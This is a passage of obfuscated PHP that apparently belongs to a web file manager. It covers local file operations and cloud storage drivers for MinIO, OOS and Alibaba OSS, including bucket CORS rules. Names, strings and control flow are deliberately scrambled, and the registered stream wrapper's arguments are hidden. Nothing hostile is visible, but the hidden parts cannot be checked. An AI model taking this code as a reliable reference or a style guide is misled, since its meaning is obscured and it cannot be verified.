$BË“Â•– =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C™õ‡² ­Ğ = $this->iconvSystem($C™õ‡² ­Ğ); if (!is_dir($C™õ‡² ­Ğ)) { return !0; } goto FÚÀÇìĞ°ï; bÓŒ¼óËÈ¾: return rmdir($C™õ‡² ­Ğ); goto e¾ÛÒŒÕ»; FÚÀÇìĞ°ï: if (!($e†¦Ô­œÕ = opendir($C™õ‡² ­Ğ))) { return !1; } while (($AñÁùÒ¾Ê› = readdir($e†¦Ô­œÕ)) !== !1) { if ($AñÁùÒ¾Ê› == $BË“Â•–[91] || $AñÁùÒ¾Ê› == $BË“Â•–[1171]) { continue; } $F­Ù•ºÉñ† = $C™õ‡² ­Ğ . $BË“Â•–[8] . $AñÁùÒ¾Ê›; if (is_file($F­Ù•ºÉñ†) || is_link($F­Ù•ºÉñ†)) { if (!unlink($F­Ù•ºÉñ†)) { chmod($F­Ù•ºÉñ†, 511); if (!unlink($F­Ù•ºÉñ†)) { return !1; } } } else { if (is_dir($F­Ù•ºÉñ†)) { chmod($F­Ù•ºÉñ†, 511); $F­Ù•ºÉñ† = $this->iconvApp($F­Ù•ºÉñ†); if (!$this->delFolder($F­Ù•ºÉñ†)) { return !1; } } } } closedir($e†¦Ô­œÕ); goto bÓŒ¼óËÈ¾; e¾ÛÒŒÕ»: } public function rename($eê²ºğè³, $D§ëšĞğÂ) { goto bÕÀ®Ö·“Æ; bÕÀ®Ö·“Æ: $bğ¦ÊÁÁã¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÑÊÇ—×Ó = $this->fileNameAuto($this->pathFather($eê²ºğè³), $D§ëšĞğÂ); $cÑÊÇ—×Ó = $this->iconvSystem($cÑÊÇ—×Ó); goto AÅÒ½ã·; Cùˆßô˜ø: $FøçÈ¥ˆÊ = @rename($eê²ºğè³, $cÄ’ÍŠîÃí); $cÄ’ÍŠîÃí = $this->iconvApp($cÄ’ÍŠîÃí); return $FøçÈ¥ˆÊ ? $this->getPathOuter($cÄ’ÍŠîÃí) : !1; goto BÂ“»¤Ñ™Ã; AÅÒ½ã·: $eê²ºğè³ = $this->iconvSystem($eê²ºğè³); $fèà£¨¼ = $this->pathFather($eê²ºğè³); $cÄ’ÍŠîÃí = rtrim($fèà£¨¼, $bğ¦ÊÁÁã¬[8]) . $bğ¦ÊÁÁã¬[8] . $cÑÊÇ—×Ó; goto Cùˆßô˜ø; BÂ“»¤Ñ™Ã: } public function size($FŠ¤š‚µš²) { $FŠ¤š‚µš² = $this->iconvSystem($FŠ¤š‚µš²); return (double) abs(sprintf($_SERVER[³‘’¼äÑ™ÔÍ][1173], @filesize($FŠ¤š‚µš²))); } public function info($c­Š½Şˆ) { $c­Š½Şˆ = $this->iconvSystem($c­Š½Şˆ); if ($this->isFolder($c­Š½Şˆ)) { return $this->folderInfo($c­Š½Şˆ); } else { if ($this->isFile($c­Š½Şˆ)) { return $this->fileInfo($c­Š½Şˆ); } } return !1; } protected function infoChildren($FËåÛ—çÌ, &$Bïèä¶ùÈ, $E½ÔîğŒéÖ = true) { goto C«°Ó·ì®; C«°Ó·ì®: $AæÑìÌíÑ“ =& $_SERVER[³‘’¼äÑ™ÔÍ]; check_abort(); $FËåÛ—çÌ = rtrim($FËåÛ—çÌ, $AæÑìÌíÑ“[8]) . $AæÑìÌíÑ“[8]; goto CÕˆØ¾ƒÁØ; CÕˆØ¾ƒÁØ: if ($E½ÔîğŒéÖ) { $FËåÛ—çÌ = $this->iconvSystem($FËåÛ—çÌ); } if (!($DÓ¾À¦Ãéî = @opendir($FËåÛ—çÌ))) { return; } while (($eÛªƒƒˆÉÆ = readdir($DÓ¾À¦Ãéî)) !== !1) { if ($eÛªƒƒˆÉÆ == $AæÑìÌíÑ“[91] || $eÛªƒƒˆÉÆ == $AæÑìÌíÑ“[1171]) { continue; } $f¡âëÑÌ…ê = $FËåÛ—çÌ . $eÛªƒƒˆÉÆ; if (is_file($f¡âëÑÌ…ê) || is_link($f¡âëÑÌ…ê)) { $Bïèä¶ùÈ[$AæÑìÌíÑ“[78]]++; $Bïèä¶ùÈ[$AæÑìÌíÑ“[77]] += (double) abs(sprintf($AæÑìÌíÑ“[1173], @filesize($f¡âëÑÌ…ê))); } else { if (is_dir($f¡âëÑÌ…ê)) { $Bïèä¶ùÈ[$AæÑìÌíÑ“[79]]++; $this->infoChildren($f¡âëÑÌ…ê, $Bïèä¶ùÈ, !1); } } } goto B¨ÌŠ•êµ¾; B¨ÌŠ•êµ¾: closedir($DÓ¾À¦Ãéî); goto bªÚ¹’‹®; bªÚ¹’‹®: } private function folderInfo($Cø¹¿ëƒ, $B³¾Óáƒ¦¬ = false) { $aä´¯¢‡ì« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Cø¹¿ëƒ = rtrim($Cø¹¿ëƒ, $aä´¯¢‡ì«[8]) . $aä´¯¢‡ì«[8]; $Eˆ¹¼×‘×Ã = $this->iconvApp($this->pathThis($Cø¹¿ëƒ)); if ($B³¾Óáƒ¦¬) { return array($aä´¯¢‡ì«[28] => $Eˆ¹¼×‘×Ã, $aä´¯¢‡ì«[75] => $this->getPathOuter($Cø¹¿ëƒ), $aä´¯¢‡ì«[29] => $aä´¯¢‡ì«[76]); } $c¯ÏÙ¢áô¡ = array($aä´¯¢‡ì«[28] => $Eˆ¹¼×‘×Ã, $aä´¯¢‡ì«[75] => $this->getPathOuter($Cø¹¿ëƒ), $aä´¯¢‡ì«[29] => $aä´¯¢‡ì«[76], $aä´¯¢‡ì«[187] => @filectime($Cø¹¿ëƒ), $aä´¯¢‡ì«[107] => @filemtime($Cø¹¿ëƒ), $aä´¯¢‡ì«[1174] => @fileatime($Cø¹¿ëƒ), $aä´¯¢‡ì«[1168] => is_readable($Cø¹¿ëƒ), $aä´¯¢‡ì«[1169] => is_writable($Cø¹¿ëƒ), $aä´¯¢‡ì«[1175] => get_mode($Cø¹¿ëƒ)); return $c¯ÏÙ¢áô¡; } private function fileInfo($E˜ïÊƒç‰…, $E¤ÏÖ§÷Ö = false) { $bóë§Àæ‘ß =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e…‚ÈºÙ§ = $this->iconvApp($this->pathThis($E˜ïÊƒç‰…)); if ($E¤ÏÖ§÷Ö) { return array($bóë§Àæ‘ß[28] => $e…‚ÈºÙ§, $bóë§Àæ‘ß[75] => $this->getPathOuter($E˜ïÊƒç‰…), $bóë§Àæ‘ß[29] => $bóë§Àæ‘ß[167], $bóë§Àæ‘ß[77] => $this->size($E˜ïÊƒç‰…), $bóë§Àæ‘ß[160] => $this->ext($e…‚ÈºÙ§)); } $F’½´†øÓ› = array($bóë§Àæ‘ß[28] => $e…‚ÈºÙ§, $bóë§Àæ‘ß[75] => $this->getPathOuter($E˜ïÊƒç‰…), $bóë§Àæ‘ß[29] => $bóë§Àæ‘ß[167], $bóë§Àæ‘ß[187] => @filectime($E˜ïÊƒç‰…), $bóë§Àæ‘ß[107] => @filemtime($E˜ïÊƒç‰…), $bóë§Àæ‘ß[1174] => @fileatime($E˜ïÊƒç‰…), $bóë§Àæ‘ß[77] => $this->size($E˜ïÊƒç‰…), $bóë§Àæ‘ß[160] => $this->ext($e…‚ÈºÙ§), $bóë§Àæ‘ß[1168] => is_readable($E˜ïÊƒç‰…), $bóë§Àæ‘ß[1169] => is_writable($E˜ïÊƒç‰…), $bóë§Àæ‘ß[1175] => get_mode($E˜ïÊƒç‰…)); return $F’½´†øÓ›; } public function exist($E±óµŠ°©) { $E±óµŠ°© = $this->iconvSystem($E±óµŠ°©); return @file_exists($E±óµŠ°©); } public function isFile($F‘†ö¶Œé†) { $F‘†ö¶Œé† = $this->iconvSystem($F‘†ö¶Œé†); return @is_file($F‘†ö¶Œé†); } public function isFolder($FÓ†”ë§”ñ) { $FÓ†”ë§”ñ = $this->iconvSystem($FÓ†”ë§”ñ); return @is_dir($FÓ†”ë§”ñ); } public function listPath($DÂàâ«†›î, $bÛ¶àÍ«Ì = false) { goto E“®ö’†Æ¹; F›©½ÛÙğÇ: $eŠÚ¶ƒ˜“ = array($aê’ğ†Êö„[74] => array(), $aê’ğ†Êö„[73] => array()); if (!($e®ÕŸŞÏ½â = @opendir($DÂàâ«†›î))) { return $eŠÚ¶ƒ˜“; } while (($dˆÌÁÏêÕé = readdir($e®ÕŸŞÏ½â)) !== !1) { if ($dˆÌÁÏêÕé == $aê’ğ†Êö„[91] || $dˆÌÁÏêÕé == $aê’ğ†Êö„[1171]) { continue; } $Bİ©ˆ“Ï¥‘ = $DÂàâ«†›î . $dˆÌÁÏêÕé; if (is_file($Bİ©ˆ“Ï¥‘)) { $eŠÚ¶ƒ˜“[$aê’ğ†Êö„[73]][] = $this->fileInfo($Bİ©ˆ“Ï¥‘, $bÛ¶àÍ«Ì); } else { $eŠÚ¶ƒ˜“[$aê’ğ†Êö„[74]][] = $this->folderInfo($Bİ©ˆ“Ï¥‘, $bÛ¶àÍ«Ì); } } goto c ¾’ñ«áè; c ¾’ñ«áè: closedir($e®ÕŸŞÏ½â); return $eŠÚ¶ƒ˜“; goto a÷ÅÜË‘õ‰; E“®ö’†Æ¹: $aê’ğ†Êö„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DÂàâ«†›î = $this->iconvSystem($DÂàâ«†›î); $DÂàâ«†›î = rtrim($DÂàâ«†›î, $aê’ğ†Êö„[8]) . $aê’ğ†Êö„[8]; goto F›©½ÛÙğÇ; a÷ÅÜË‘õ‰: } public function listAll($A‰ôïØ·À—, &$eÚÓ”ğ¾‰ˆ = array()) { goto D†áøÕÆ; D†áøÕÆ: $bá¤õ“¥â =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A‰ôïØ·À— = $this->iconvSystem($A‰ôïØ·À—); $A‰ôïØ·À— = rtrim($A‰ôïØ·À—, $bá¤õ“¥â[8]) . $bá¤õ“¥â[8]; goto BÕÉ‰ÅÑ°; BÕÉ‰ÅÑ°: if (!($FÅ¿œ¸ƒï½ = @opendir($A‰ôïØ·À—))) { return $eÚÓ”ğ¾‰ˆ; } while (($Eòğ°ºö±Ì = readdir($FÅ¿œ¸ƒï½)) !== !1) { if ($Eòğ°ºö±Ì == $bá¤õ“¥â[91] || $Eòğ°ºö±Ì == $bá¤õ“¥â[1171]) { continue; } $eŸö‚ Ë‰‡ = $A‰ôïØ·À— . $Eòğ°ºö±Ì; if (is_dir($eŸö‚ Ë‰‡) && !is_link($eŸö‚ Ë‰‡)) { $eÚÓ”ğ¾‰ˆ[] = array($bá¤õ“¥â[75] => $eŸö‚ Ë‰‡ . $bá¤õ“¥â[8], $bá¤õ“¥â[76] => 1, $bá¤õ“¥â[107] => @filemtime($eŸö‚ Ë‰‡), $bá¤õ“¥â[77] => 0); $this->listAll($eŸö‚ Ë‰‡, $eÚÓ”ğ¾‰ˆ); } else { $eÚÓ”ğ¾‰ˆ[] = array($bá¤õ“¥â[75] => $eŸö‚ Ë‰‡, $bá¤õ“¥â[76] => 0, $bá¤õ“¥â[107] => @filemtime($eŸö‚ Ë‰‡), $bá¤õ“¥â[77] => $this->size($eŸö‚ Ë‰‡)); } } closedir($FÅ¿œ¸ƒï½); goto A¨ÙÑñà¯‰; A¨ÙÑñà¯‰: return $eÚÓ”ğ¾‰ˆ; goto a£òÑ§×ÜÑ; a£òÑ§×ÜÑ: } public function has($E÷˜á²³Áğ, $fù”ñæ¿Ç = false, $E½æí¡¦‚ = true) { goto c–Ş³Ÿ°ø¶; f×ã›–Ü¯µ: if (!($bµõÍÆÙ¸ = @opendir($E÷˜á²³Áğ))) { return !1; } $F½· ¨†à· = 0; $B„±àã­³ = 0; goto A¢ÌåÓ…¤‡; cÛŒ¨Ğõª: if ($fù”ñæ¿Ç) { return array($ağÄÆ Ë¢Ä[191] => $F½· ¨†à·, $ağÄÆ Ë¢Ä[192] => $B„±àã­³); } return !1; goto AâËñÓ‰Ö; A¢ÌåÓ…¤‡: $EŞÇ°–®Ò = 0; while (($c¤Ù¢—ÎÄ½ = readdir($bµõÍÆÙ¸)) !== !1) { if ($c¤Ù¢—ÎÄ½ == $ağÄÆ Ë¢Ä[91] || $c¤Ù¢—ÎÄ½ == $ağÄÆ Ë¢Ä[1171]) { continue; } $AÄç¸Û·¼ = $E÷˜á²³Áğ . $c¤Ù¢—ÎÄ½; if ($fù”ñæ¿Ç) { $EŞÇ°–®Ò++; if (@is_file($AÄç¸Û·¼)) { $F½· ¨†à·++; } else { $B„±àã­³++; } if ($EŞÇ°–®Ò > 10000) { break; } continue; } if ($E½æí¡¦‚) { if (@is_file($AÄç¸Û·¼)) { return !0; } } else { if (@is_dir($AÄç¸Û·¼ . $ağÄÆ Ë¢Ä[8])) { return !0; } } } closedir($bµõÍÆÙ¸); goto cÛŒ¨Ğõª; c–Ş³Ÿ°ø¶: $ağÄÆ Ë¢Ä =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E÷˜á²³Áğ = $this->iconvSystem($E÷˜á²³Áğ); $E÷˜á²³Áğ = rtrim($E÷˜á²³Áğ, $ağÄÆ Ë¢Ä[8]) . $ağÄÆ Ë¢Ä[8]; goto f×ã›–Ü¯µ; AâËñÓ‰Ö: } public function hashSimple($f¸¦œÇ‰Ì¾) { goto D¤î“¥¼·; BõÉÙÈ : $CŞ’ì§ï¶• = $this->size($f¸¦œÇ‰Ì¾); $fÚ‚÷«ÀÔ§ = 200; $B…›‡ê†©¢ = 50; goto AÙÑÌÔïÄÂ; CùÑ¸©÷: $dÒŠ„‡Œ‹‘ = fopen($f¸¦œÇ‰Ì¾, $C‘Ù¤µˆ®İ[1176]); if (!$dÒŠ„‡Œ‹‘) { return $fíŞñ´µ…ì; } for ($bø¹É’æ·  = 0; $bø¹É’æ·  < $B…›‡ê†©¢; $bø¹É’æ· ++) { fseek($dÒŠ„‡Œ‹‘, $BŞø«æ‡Ì„ * $bø¹É’æ· ); $fíŞñ´µ…ì .= fread($dÒŠ„‡Œ‹‘, $fÚ‚÷«ÀÔ§); } goto fîÅÀ²¿Úâ; fîÅÀ²¿Úâ: fseek($dÒŠ„‡Œ‹‘, $CŞ’ì§ï¶• - $fÚ‚÷«ÀÔ§); $fíŞñ´µ…ì .= fread($dÒŠ„‡Œ‹‘, $fÚ‚÷«ÀÔ§); fclose($dÒŠ„‡Œ‹‘); goto f’ó‚õŠ»ö; f’ó‚õŠ»ö: return md5($fíŞñ´µ…ì) . $CŞ’ì§ï¶•; goto E¿ÒàÌœÙ“; D¤î“¥¼·: $C‘Ù¤µˆ®İ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$f¸¦œÇ‰Ì¾) { return md5($C‘Ù¤µˆ®İ[33]); } $f¸¦œÇ‰Ì¾ = $this->iconvSystem($f¸¦œÇ‰Ì¾); goto BõÉÙÈ ; AÙÑÌÔïÄÂ: if ($CŞ’ì§ï¶• <= $fÚ‚÷«ÀÔ§ * $B…›‡ê†©¢) { return $this->hashMd5($f¸¦œÇ‰Ì¾) . $CŞ’ì§ï¶•; } $fíŞñ´µ…ì = $C‘Ù¤µˆ®İ[33]; $BŞø«æ‡Ì„ = intval($CŞ’ì§ï¶• / $B…›‡ê†©¢); goto CùÑ¸©÷; E¿ÒàÌœÙ“: } public function getContent($B†˜†Ç‡¾) { $B†˜†Ç‡¾ = $this->iconvSystem($B†˜†Ç‡¾); return file_get_contents($B†˜†Ç‡¾); } public function setContent($CÜÚ¯ƒ‡ÛË, $eÂ¡Îß²µ = '') { $CÜÚ¯ƒ‡ÛË = $this->iconvSystem($CÜÚ¯ƒ‡ÛË); @file_put_contents($CÜÚ¯ƒ‡ÛË, $eÂ¡Îß²µ, LOCK_EX); clearstatcache(); return strlen($eÂ¡Îß²µ) == filesize($CÜÚ¯ƒ‡ÛË); } public function fileSubstr($dˆŸÑ˜ÁæŸ, $D­§”¾«åİ = 0, $D‘ó»Í¾« = false) { goto dØƒ–„˜ÚÃ; aç“ÄÌë: if ($D‘ó»Í¾« <= 0) { return $eñ÷†ù¥ï[33]; } $c˜¬øÙÖƒà = fopen($dˆŸÑ˜ÁæŸ, $eñ÷†ù¥ï[1176]); if (!$c˜¬øÙÖƒà) { return !1; } goto B¡ç†ŸÖ; dØƒ–„˜ÚÃ: $eñ÷†ù¥ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dˆŸÑ˜ÁæŸ = $this->iconvSystem($dˆŸÑ˜ÁæŸ); if ($D‘ó»Í¾« === !1) { $D‘ó»Í¾« = $this->size($dˆŸÑ˜ÁæŸ); } goto aç“ÄÌë; Cí‹ë¾àÖ©: return $FßºÕ÷—½; goto AŒñ©ŠÙ¬†; B¡ç†ŸÖ: fseek($c˜¬øÙÖƒà, $D­§”¾«åİ); $FßºÕ÷—½ = fread($c˜¬øÙÖƒà, $D‘ó»Í¾«); fclose($c˜¬øÙÖƒà); goto Cí‹ë¾àÖ©; AŒñ©ŠÙ¬†: } public function upload($f¡ƒ§ÍŞíğ, $b² ß¡ô‚, $D¹ï¶âÀõ¿ = false, $DğÖÉÂš¨Á = REPEAT_REPLACE) { $Bî„¾¡¡‹ = $this->copyFile($b² ß¡ô‚, $f¡ƒ§ÍŞíğ); return $Bî„¾¡¡‹ ? $this->getPathOuter($f¡ƒ§ÍŞíğ) : !1; } public function setModifyTime($C›Û±ÉØĞ, $FŒ¿·»³ß» = '') { @touch($C›Û±ÉØĞ, intval($FŒ¿·»³ß»)); } public function download($Bš†íİÍ½, $Aß¦½Ääá) { return $this->iconvSystem($Bš†íİÍ½); } } goto A‡‰”ÛöÛ£; fŸ˜å·ŠˆÄ: define($_SERVER[³‘’¼äÑ™ÔÍ][1941], 2); define($_SERVER[³‘’¼äÑ™ÔÍ][1942], 3); define($_SERVER[³‘’¼äÑ™ÔÍ][1943], 4); goto Eæƒ”Æ·Ì¾; Døêš¸ë—: $_SERVER[$_SERVER[Êß·®ÍËúû][52]] = (strrev('4579')."\x30\x34")+0;$_ZnFS="KJwa7iZH36M5asJAxdEiiwbDHDHGdNxaMIEQrTURpPIsCtYeASHQMqt2uSzir7aPyJsMNbfwJY8e5R7y";; stream_wrapper_register($_SERVER[Êß·®ÍËúû][53], $_SERVER[Êß·®ÍËúû][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($fñ†Ó·ßÕÍ, $AÕœ…ĞÌ¼´) { $Eİ…ãÎÜ®Ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset(self::$_methodList[$fñ†Ó·ßÕÍ])) { return @call_user_func_array(self::$_methodList[$fñ†Ó·ßÕÍ], $AÕœ…ĞÌ¼´); } else { if (method_exists($this, $fñ†Ó·ßÕÍ)) { return call_user_func_array(array($this, $fñ†Ó·ßÕÍ), $AÕœ…ĞÌ¼´); } else { think_exception(__CLASS__ . $Eİ…ãÎÜ®Ò[4] . $fñ†Ó·ßÕÍ . $Eİ…ãÎÜ®Ò[5]); } } } public static function __callStatic($b¿×ÃÍŒÈî, $C†¶ï­™Ï­) { if (isset(self::$_methodListStatic[$b¿×ÃÍŒÈî])) { return call_user_func_array(self::$_methodListStatic[$b¿×ÃÍŒÈî], $C†¶ï­™Ï­); } else { if (method_exists(self, $b¿×ÃÍŒÈî)) { return call_user_func_array(array(self, $b¿×ÃÍŒÈî), $C†¶ï­™Ï­); } else { show_json("{$b¿×ÃÍŒÈî}\50\51\x20\x6e\157\164\x20\145\170\x69\x73\164\x3b", !1); } } } public static function addMethod($fŠïÁì†‡ò, $a¢İ†¤Í) { self::$_methodList[$fŠïÁì†‡ò] = $a¢İ†¤Í; } public static function addMethodStatic($CñÊæ¤§İ™, $d³ª©ãÉßŸ) { self::$_methodListStatic[$CñÊæ¤§İ™] = $d³ª©ãÉßŸ; } } goto Fğº¹î†‹; A‡‰”ÛöÛ£: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($BôÍ¯†³èå) { parent::__construct($BôÍ¯†³èå); $this->signatureVersion($_SERVER[³‘’¼äÑ™ÔÍ][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d‰øíÏ«¿) { parent::__construct($d‰øíÏ«¿); $this->signatureVersion($_SERVER[³‘’¼äÑ™ÔÍ][200]); } public function fileOutLink($DĞ …ªîÒ) { $c··ÑÌšªï =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (substr($DĞ …ªîÒ, 0, 7) == $c··ÑÌšªï[1119]) { $DĞ …ªîÒ = $c··ÑÌšªï[1120] . substr($DĞ …ªîÒ, 7); } header($c··ÑÌšªï[156] . $DĞ …ªîÒ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($AĞ°ĞğÎÆ…) { parent::__construct(); include_once SDK_DIR . $_SERVER[³‘’¼äÑ™ÔÍ][1177]; $this->_init($AĞ°ĞğÎÆ…); } public function _init($fæà­êß°) { foreach ($fæà­êß° as $a®ƒÈ¯Š => $FÂïØŞƒ) { if (isset($this->{$a®ƒÈ¯Š})) { $this->{$a®ƒÈ¯Š} = $FÂïØŞƒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[³‘’¼äÑ™ÔÍ][1178], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto DÄ²Ş†Ç; DÄ²Ş†Ç: $FøˆÉäõ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c‚à’ÍÚŒ = new OSS\Model\CorsConfig(); $fª·˜—ã§Ğ = new OSS\Model\CorsRule(); goto b‹ĞÉæ¯‰ˆ; E®¢¥±Ô§: $fª·˜—ã§Ğ->setMaxAgeSeconds(600); $fª·˜—ã§Ğ->addExposeHeader($FøˆÉäõ[1184]); $fª·˜—ã§Ğ->addAllowedHeader($FøˆÉäõ[1179]); goto c¥š´Ù¥›£; CšÜäÛ‡¼: $fª·˜—ã§Ğ->addAllowedMethod($FøˆÉäõ[1182]); $fª·˜—ã§Ğ->addAllowedMethod($FøˆÉäõ[1183]); $fª·˜—ã§Ğ->addAllowedMethod($FøˆÉäõ[155]); goto E®¢¥±Ô§; b‹ĞÉæ¯‰ˆ: $fª·˜—ã§Ğ->addAllowedOrigin($FøˆÉäõ[1179]); $fª·˜—ã§Ğ->addAllowedMethod($FøˆÉäõ[1180]); $fª·˜—ã§Ğ->addAllowedMethod($FøˆÉäõ[1181]); goto CšÜäÛ‡¼; c¥š´Ù¥›£: $c‚à’ÍÚŒ->addRule($fª·˜—ã§Ğ); try { $this->client->putBucketCors($this->bucket, $c‚à’ÍÚŒ); } catch (OSS\Core\OssException $dÄëŞŒĞ–Š) { return !1; } return !0; goto EÛî¦ÚÔ¢; EÛî¦ÚÔ¢: } public function getBucketCors() { goto cò„…†’¿; bÈÓ¤ãñ¬´: return array($dÚÄô™Ò[175] => isset($c¦¼ëƒ–ƒ[0]) ? $c¦¼ëƒ–ƒ[0] : $dÚÄô™Ò[33], $dÚÄô™Ò[179] => $AÈÇà•Ìò, $dÚÄô™Ò[1185] => $e¦£Õ®ØÅÚ, $dÚÄô™Ò[1186] => isset($c·ÀÎÃ¡…«[0]) ? $c·ÀÎÃ¡…«[0] : $dÚÄô™Ò[33], $dÚÄô™Ò[177] => isset($cš¹ÖÑµĞÑ[0]) ? $cš¹ÖÑµĞÑ[0] : $dÚÄô™Ò[33]); goto b¿é¸¨Ïøƒ; FåªÌ…÷: if (!$fğÇôÊ•òä || !($C°–Ã­åÛ = $fğÇôÊ•òä->getRules())) { return null; } $c¦¼ëƒ–ƒ = $C°–Ã­åÛ[0]->getAllowedOrigins(); $AÈÇà•Ìò = $C°–Ã­åÛ[0]->getAllowedMethods(); goto b²®§¤İæ; cò„…†’¿: $dÚÄô™Ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fğÇôÊ•òä = null; try { $fğÇôÊ•òä = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Dô‹¬Í­…) { return null; } goto FåªÌ…÷; b²®§¤İæ: $e¦£Õ®ØÅÚ = $C°–Ã­åÛ[0]->getMaxAgeSeconds(); $c·ÀÎÃ¡…« = $C°–Ã­åÛ[0]->getExposeHeaders(); $cš¹ÖÑµĞÑ = $C°–Ã­åÛ[0]->getAllowedHeaders(); goto bÈÓ¤ãñ¬´; b¿é¸¨Ïøƒ: } public function isBucketCors() { goto bÃ°»‡é…; c•Ï¾º¨•: if ($f­®Ì›Ş„[$dØŸ¹ãçÔâ[175]] != $dØŸ¹ãçÔâ[176] || $f­®Ì›Ş„[$dØŸ¹ãçÔâ[177]] != $dØŸ¹ãçÔâ[176]) { return !1; } $fÁÄøŸÉÆè = array_map($dØŸ¹ãçÔâ[178], $f­®Ì›Ş„[$dØŸ¹ãçÔâ[179]]); if (!is_array($fÁÄøŸÉÆè)) { $fÁÄøŸÉÆè = array(); } goto DÙåŸÔĞ³; bÃ°»‡é…: $dØŸ¹ãçÔâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f­®Ì›Ş„ = $this->getBucketCors(); if (!$f­®Ì›Ş„ || !is_array($f­®Ì›Ş„)) { return !1; } goto c•Ï¾º¨•; DÙåŸÔĞ³: $b†ßÔƒ§§ = array($dØŸ¹ãçÔâ[180], $dØŸ¹ãçÔâ[181], $dØŸ¹ãçÔâ[182], $dØŸ¹ãçÔâ[183], $dØŸ¹ãçÔâ[184]); $EÉÕ–ê¿×ˆ = array_diff($b†ßÔƒ§§, $fÁÄøŸÉÆè); return empty($EÉÕ–ê¿×ˆ); goto aËåæÏèŠ×; aËåæÏèŠ×: } public function mkfile($dÈÌËØµ, $dÊî¬†“œ§ = '', $EÈñ¢µ³« = REPEAT_RENAME) { $Eõ–õ½‹´ = $this->setContent($dÈÌËØµ, $dÊî¬†“œ§); if ($Eõ–õ½‹´ !== !1) { return $this->getPathOuter($dÈÌËØµ); } return !1; } public function mkdir($C­í»¾ÎØ, $fò«¹ìí‚ = REPEAT_SKIP) { if ($this->_isFolder($C­í»¾ÎØ)) { return $this->getPathOuter($C­í»¾ÎØ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($C­í»¾ÎØ)); } catch (OSS\Core\OssException $FÌøîà¢å³) { return !1; } return $this->getPathOuter($C­í»¾ÎØ); } private function fileList($EÕ¹ˆ’‰çç, $c³‘õ‰Ô¡ = '', $a¿á«ù ¥å = 0) { goto fİ”ë•åïÅ; dÈïÑ°Ï–Ú: $BĞŠÛâùÇ = $Eê„²‡ßÒ[33]; $D¥ÄÓ–ìÄ = 1000; $eÍøÑƒÜŠø = $b‘Õ²µğø = array(); goto Cİ¬ï…ë‡; fİ”ë•åïÅ: $Eê„²‡ßÒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÕ¹ˆ’‰çç = trim($EÕ¹ˆ’‰çç, $Eê„²‡ßÒ[8]); $d¡·–‚Ø°À = empty($EÕ¹ˆ’‰çç) ? $Eê„²‡ßÒ[33] : $EÕ¹ˆ’‰çç . $Eê„²‡ßÒ[8]; goto dÈïÑ°Ï–Ú; Cİ¬ï…ë‡: while (!0) { $Aó”°©À˜æ = array($Eê„²‡ßÒ[1187] => $c³‘õ‰Ô¡, $Eê„²‡ßÒ[186] => $d¡·–‚Ø°À, $Eê„²‡ßÒ[1188] => $D¥ÄÓ–ìÄ, $Eê„²‡ßÒ[1189] => $BĞŠÛâùÇ); try { $cœ÷Ğ µÃ© = $this->client->listObjects($this->bucket, $Aó”°©À˜æ); } catch (OSS\Core\OssException $c¡­Š¨å ã) { break; } $BĞŠÛâùÇ = $cœ÷Ğ µÃ©->getNextMarker(); $d´ğ†ÇĞä¡ = $cœ÷Ğ µÃ©->getObjectList(); $d²í¬ƒÃÍ› = $cœ÷Ğ µÃ©->getPrefixList(); foreach ($d´ğ†ÇĞä¡ as $aœ„–‡“Ì´) { if ($aœ„–‡“Ì´->getKey() == $d¡·–‚Ø°À) { continue; } $bÀõïñ»ñÛ = $aœ„–‡“Ì´->getKey(); if ($a¿á«ù ¥å) { $bÀõïñ»ñÛ = array($Eê„²‡ßÒ[28] => $bÀõïñ»ñÛ, $Eê„²‡ßÒ[77] => $aœ„–‡“Ì´->getSize(), $Eê„²‡ßÒ[190] => strtotime($aœ„–‡“Ì´->getLastModified())); } $b‘Õ²µğø[] = $bÀõïñ»ñÛ; } foreach ($d²í¬ƒÃÍ› as $Fä‘î„‹ÊÎ) { $eÍøÑƒÜŠø[] = $Fä‘î„‹ÊÎ->getPrefix(); } if ($BĞŠÛâùÇ === $Eê„²‡ßÒ[33]) { break; } } return array($Eê„²‡ßÒ[74] => $eÍøÑƒÜŠø, $Eê„²‡ßÒ[73] => $b‘Õ²µğø); goto aÜÖôœ„„†; aÜÖôœ„„†: } public function copyFile($c†­ŠÉÔã, $EÈ°“çï×’) { $Bî‚ïÊ¡Ÿ‹ = $this->size($c†­ŠÉÔã); if ($Bî‚ïÊ¡Ÿ‹ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $c†­ŠÉÔã, $this->bucket, $this->pathEncode($EÈ°“çï×’)); } catch (OSS\Core\OssException $bŠƒ›İ¿‹) { return !1; } return $this->getPathOuter($EÈ°“çï×’); } $aÛĞ÷İ‹´ = $this->multiCopyObject($c†­ŠÉÔã, $EÈ°“çï×’, $Bî‚ïÊ¡Ÿ‹); return $aÛĞ÷İ‹´ ? $this->getPathOuter($EÈ°“çï×’) : !1; } private function multiCopyObject($bË—ÈÑâƒá, 